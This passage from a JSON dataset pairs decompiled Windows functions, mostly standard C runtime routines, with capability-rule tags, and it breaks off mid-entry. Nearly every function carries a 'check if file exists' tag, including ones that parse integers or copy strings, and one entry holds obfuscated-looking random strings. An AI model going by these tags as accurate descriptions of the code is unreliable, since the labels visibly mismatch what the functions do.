}\n        else {\n            if (arg_10h < uVar3) {\n                if (arg_18h != 0xffffffff) {\n                    *arg_ch = 0;\n                    puVar1 = fcn.004039a4();\n                    uVar4 = 0x22;\n                    goto code_r0x004d2816;\n                }\n                uVar4 = 0x50;\n                uVar3 = arg_10h;\n            }\n            else {\n                uVar4 = 0;\n            }\n            arg_ch[uVar3 - 1] = 0;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = uVar3;\n        }\n    }\n    else {\n        puVar1 = fcn.004039a4();\n        uVar4 = 0x16;\ncode_r0x004d2816:\n        *puVar1 = uVar4;\n        fcn.00403751();\n    }\n    return uVar4;\n}\n",
        "token_count": 602
    },
    "0040457a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040457a(void)\n\n{\n    int32_t iVar1;\n    \n    *0x56ccd0 = fcn.00405f10(fcn.00404e76);\n    if (*0x56ccd0 != -1) {\n        iVar1 = fcn.004016a4(*0x56ccd0, 0x56f3f4);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        fcn.00402784();\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "00404584": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404584(uint8_t **arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t *arg_ch;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n    }\n    else if (((arg_8h[3] >> 0xd & 1) != 0) && ((arg_8h[3] >> 0xc & 1) == 0)) {\n        if ((arg_8h[3] >> 1 & 1) == 0) {\n            LOCK();\n            arg_8h[3] = arg_8h[3] | 1;\n            if ((arg_8h[3] & 0x4c0) == 0) {\n                fcn.00401faf(arg_8h);\n            }\n            *arg_8h = arg_8h[1];\n            puVar3 = arg_8h[6];\n            arg_ch = arg_8h[1];\n            arg_8h_00 = fcn.00405f06(arg_8h);\n            puVar3 = fcn.004027d9(arg_8h_00, arg_ch, puVar3);\n            arg_8h[2] = puVar3;\n            puVar3 = arg_8h[2];\n            if ((puVar3 != NULL) && (puVar3 != 0xffffffff)) {\n                if ((arg_8h[3] & 6) == 0) {\n                    iVar4 = fcn.00405f06(arg_8h);\n                    if ((iVar4 == -1) || (iVar4 = fcn.00405f06(arg_8h),  iVar4 == -2)) {\n                        iVar4 = 0x56cf68;\n                    }\n                    else {\n                        iVar4 = fcn.00405f06(arg_8h);\n                        uVar5 = fcn.00405f06(arg_8h);\n                        iVar4 = *((iVar4 >> 6) * 4 + 0x570220) + (uVar5 & 0x3f) * 0x38;\n                    }\n                    if ((*(iVar4 + 0x28) & 0x82) == 0x82) {\n                        LOCK();\n                        arg_8h[3] = arg_8h[3] | 0x20;\n                    }\n                }\n                if (((arg_8h[6] == 0x200) && ((arg_8h[3] >> 6 & 1) != 0)) && ((arg_8h[3] & 0x100) == 0)) {\n                    arg_8h[6] = 0x1000;\n                }\n                arg_8h[2] = arg_8h[2] + -1;\n                uVar1 = **arg_8h;\n                *arg_8h = *arg_8h + 1;\n                return uVar1;\n            }\n            LOCK();\n            arg_8h[3] = arg_8h[3] | (puVar3 != NULL) * 8 + 8;\n            arg_8h[2] = NULL;\n        }\n        else {\n            LOCK();\n            arg_8h[3] = arg_8h[3] | 0x10;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 806
    },
    "004046ab": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048231d)\n\nint32_t __cdecl fcn.004046ab(uint8_t *arg_8h, uint8_t **arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    uint8_t *arg_8h_00;\n    uint64_t uVar4;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        arg_ch = &var_4h;\n    }\n    uVar3 = *arg_8h;\n    arg_8h_00 = arg_8h;\n    while (iVar1 = fcn.00405cc2(uVar3),  iVar1 != 0) {\n        arg_8h_00 = arg_8h_00 + 1;\n        uVar3 = *arg_8h_00;\n    }\n    uVar3 = *arg_8h_00;\n    if ((uVar3 == 0x2d) || (uVar3 == 0x2b)) {\n        arg_8h_00 = arg_8h_00 + 1;\n    }\n    else {\n        uVar3 = 0x2b;\n    }\n    uVar4 = fcn.0040423c(arg_8h_00, arg_ch, arg_10h, arg_14h);\n    if (arg_8h_00 == *arg_ch) {\n        *arg_ch = arg_8h;\ncode_r0x004822f1:\n        if (uVar4 != 0) goto code_r0x00482335;\n    }\n    else if (arg_8h == *arg_ch) goto code_r0x004822f1;\n    if ((uVar3 != 0x2b) || (uVar4 < 0x8000000000000000)) {\n        if (uVar3 != 0x2d) {\n            return uVar4;\n        }\n        if (uVar4 < 0x8000000000000001) {\n            return -uVar4;\n        }\n    }\ncode_r0x00482335:\n    iVar1 = 0;\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0x22;\n    if (arg_14h != NULL) {\n        *arg_14h = 1;\n    }\n    if (uVar3 != 0x2d) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 568
    },
    "00404a89": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00404a89(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f388;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00401cda(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f388 = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 419
    },
    "00404bce": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00404bce(void)\n\n{\n    if (*0x56d930 == -2) {\n        fcn.004df91d();\n    }\n    return *0x56d930 != -1;\n}\n",
        "token_count": 49
    },
    "00404c91": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404c91(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_ch = param_1[10];\n    arg_8h = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403f3f(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x55055c;\n            param_1[0xd] = 0x55055c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403e18(arg_8h, arg_ch);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 334
    },
    "00404f16": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00404f16(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_10h;\n    uVar5 = arg_ch;\n    if ((-1 < arg_10h) && ((0 < arg_10h || (arg_ch != 0)))) {\n        do {\n            if (*in_ECX[7] == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *in_ECX[0xb];\n            }\n            var_8h = uVar4 >> 0x1f;\n            if ((var_8h < 0) || ((-1 < uVar4 || var_8h < 0 && (uVar4 == 0)))) {\n                pcVar1 = *(*in_ECX + 0x1c);\n                (**0x573000)();\n                iVar2 = (*pcVar1)();\n                if (iVar2 == -1) break;\n                bVar6 = uVar5 != 0;\n                uVar5 = uVar5 - 1;\n                iVar3 = iVar3 + -1 + bVar6;\n                uVar4 = 1;\n                *arg_8h = iVar2;\n            }\n            else {\n                if ((iVar3 <= var_8h) && ((iVar3 < var_8h || (uVar5 < uVar4)))) {\n                    uVar4 = uVar5;\n                    var_8h = iVar3;\n                }\n                fcn.0040576d(arg_8h, *in_ECX[7], uVar4);\n                bVar6 = uVar5 < uVar4;\n                uVar5 = uVar5 - uVar4;\n                iVar3 = (iVar3 - var_8h) - bVar6;\n                *in_ECX[0xb] = *in_ECX[0xb] - uVar4;\n                *in_ECX[7] = *in_ECX[7] + uVar4;\n            }\n            arg_8h = arg_8h + uVar4;\n            if ((iVar3 < 1) && ((iVar3 < 0 || (uVar5 == 0)))) break;\n        } while( true );\n    }\n    return CONCAT44((arg_10h - iVar3) - (arg_ch < uVar5), arg_ch - uVar5);\n}\n",
        "token_count": 614
    },
    "00405173": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00405173(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f36c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00405c9f(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f36c = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 421
    },
    "004051aa": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004051aa(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f11c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00404188(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f11c = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 419
    },
    "004053a8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004053a8(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f354;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00404eb7(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f354 = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 419
    },
    "0040540c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040540c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f3e0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00404a61(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f3e0 = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 423
    },
    "0040558d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0040558d(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((*0x56ce70 == -1) || (iVar2 = fcn.004037b0(*0x56ce70),  iVar2 == 0)) {\n        iVar2 = fcn.004018b1(*0x56ce70, 0xffffffff);\n        if (iVar2 == 0) goto code_r0x004c0c39;\n        iVar2 = fcn.00404fd9(1, 0x364);\n        if (iVar2 == 0) {\n            fcn.004018b1(*0x56ce70, 0);\n        }\n        else {\n            iVar3 = fcn.004018b1(*0x56ce70, iVar2);\n            if (iVar3 != 0) {\n                fcn.004c0657(iVar2, 0x570218);\n                fcn.00406302(0);\n                goto code_r0x004c0c31;\n            }\n            fcn.004018b1(*0x56ce70, 0);\n        }\n        fcn.00406302(iVar2);\n    }\n    else {\n        if (iVar2 == -1) goto code_r0x004c0c39;\ncode_r0x004c0c31:\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\ncode_r0x004c0c39:\n    fcn.00404e94();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 371
    },
    "00405998": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_22ch\n// WARNING: Variable defined which should be unmapped: var_20ch\n// WARNING: Variable defined which should be unmapped: var_230h\n// WARNING: Variable defined which should be unmapped: var_234h\n\nvoid __cdecl fcn.00405998(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint extraout_EDX;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint *puStackY840;\n    uint uStackY836;\n    uint uStackY832;\n    uint *puStackY828;\n    uint *puStackY824;\n    uint arg_8h_00;\n    uint *ExceptionInfo;\n    uint *var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_314h;\n    uint var_2d0h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint *var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint32_t var_210h;\n    uchar *var_20ch;\n    uint var_208h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if (arg_8h != -1) {\n        puStackY824 = 0x492202;\n        fcn.00404fac();\n    }\n    puStackY828 = &fcn.00405998::var_320h;\n    puStackY824 = NULL;\n    uStackY832 = 0x492213;\n    fcn.0040314d();\n    uStackY832 = 0x2cc;\n    puStackY840 = &fcn.00405998::var_2d0h;\n    uStackY836 = 0;\n    fcn.0040314d();\n    ExceptionInfo = &fcn.00405998::var_320h;\n    var_324h = &fcn.00405998::var_2d0h;\n    var_210h = (in_NT & 1) * 0x4000 | SCARRY4(&stack0xfffffcb8, 0x18) * 0x800 | (in_IF & 1) * 0x200 |\n               (in_TF & 1) * 0x100 | (&stack0xfffffcd0 < 0) * 0x80 | (*0x10 == 0x330) * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(&stack0xfffffcd0 & 0xff) & 1U) == 0) * 4 | 0xffffffe7 < &stack0xfffffcb8 |\n               (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    var_2d0h = 0x10001;\n    var_320h = arg_ch;\n    var_31ch = arg_10h;\n    var_228h = extraout_EDX;\n    var_220h = var_324h;\n    var_20ch = *0x10;\n    iVar1 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    arg_8h_00 = 0;\n    puStackY824 = 0x4922e6;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)();\n    puStackY824 = &fcn.00405998::ExceptionInfo;\n    puStackY828 = 0x4922f3;\n    iVar2 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)();\n    if (((iVar2 == 0) && (iVar1 == 0)) && (arg_8h != -1)) {\n        puStackY828 = arg_8h;\n        uStackY832 = 0x492309;\n        fcn.00404fac();\n    }\n    puStackY824 = 0x492315;\n    fcn.00403085(arg_8h_00);\n    return;\n}\n",
        "token_count": 1055
    },
    "00405a92": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405a92(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x004c9991:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = 0;\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    piVar4 = arg_8h;\n                    iVar5 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if (iVar1 == 0) break;\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != 0);\n                    }\n                    else {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if ((iVar1 == 0) || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *piVar4 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg_8h = 0;\n                    puVar2 = fcn.004039a4();\n                    uVar6 = 0x22;\n                    goto code_r0x004c997f;\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x004c9991;\n    puVar2 = fcn.004039a4();\n    uVar6 = 0x16;\ncode_r0x004c997f:\n    *puVar2 = uVar6;\n    fcn.00403751();\n    return uVar6;\n}\n",
        "token_count": 619
    },
    "00405afb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405afb(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0 < arg_10h) {\n        do {\n            cVar1 = fcn.00401708(unaff_EBX & 0xffff0000 | arg_ch);\n            if (cVar1 == '\\0') {\n                *arg_14h = -1;\n                iVar2 = -1;\n            }\n            else {\n                *arg_14h = *arg_14h + 1;\n                iVar2 = *arg_14h;\n            }\n        } while ((iVar2 != -1) && (iVar3 = iVar3 + 1,  iVar3 < arg_10h));\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "00405db7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00405db7(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f3a0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00404561(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f3a0 = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 422
    },
    "004060aa": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004060aa(void)\n\n{\n    if ((*0x56d930 != -1) && (*0x56d930 != -2)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x56d930);\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "0040665e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040665e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *in_ECX;\n    \n    if ((*(in_ECX + 4) != 0) && (iVar1 = fcn.00401573(arg_8h),  iVar1 != -1)) {\n        return;\n    }\n    *in_ECX = 1;\n    return;\n}\n",
        "token_count": 90
    },
    "004067f8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004067f8(void)\n\n{\n    uint uVar1;\n    uint32_t arg_ch;\n    int32_t iVar2;\n    uint arg_8h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((*0x56ce70 == -1) || (arg_ch = fcn.004037b0(*0x56ce70),  arg_ch == 0)) {\n        iVar2 = fcn.004018b1(*0x56ce70, 0xffffffff);\n        if (iVar2 != 0) {\n            arg_ch = fcn.00404fd9(1, 0x364);\n            if (arg_ch == 0) {\n                fcn.004018b1(*0x56ce70, 0);\n                arg_8h = 0;\n            }\n            else {\n                iVar2 = fcn.004018b1(*0x56ce70, arg_ch);\n                if (iVar2 != 0) {\n                    fcn.004c0657(arg_ch, 0x570218);\n                    fcn.00406302(0);\n                    goto code_r0x004c0d07;\n                }\n                arg_8h = 0;\n                fcn.004018b1(*0x56ce70, 0);\n            }\n            fcn.00406302(arg_8h);\n        }\n    }\n    else if (arg_ch != 0xffffffff) goto code_r0x004c0d07;\n    arg_ch = 0;\ncode_r0x004c0d07:\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    return -(arg_ch != 0) & arg_ch;\n}\n",
        "token_count": 376
    },
    "00403f76": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403f76(int32_t arg_8h)\n\n{\n    if (*0x56ccd0 != -1) {\n        if (arg_8h == 0) {\n            arg_8h = fcn.004040fc(*0x56ccd0);\n        }\n        fcn.004016a4(*0x56ccd0, 0);\n        fcn.00404e76(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "00401082": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401082(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44caa0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 4;\n    pcStack112 = \"oimsklgizklicygbktbbtpupvwwdaeuvrztpvgfdxxizqdivyj\";\n    auStack120[0] = 0x32;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x2c, iStack84, \"awsqfkivwcownzouawiramzvgggmtkkhqtzcigljsobr\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x3e, uStack36, 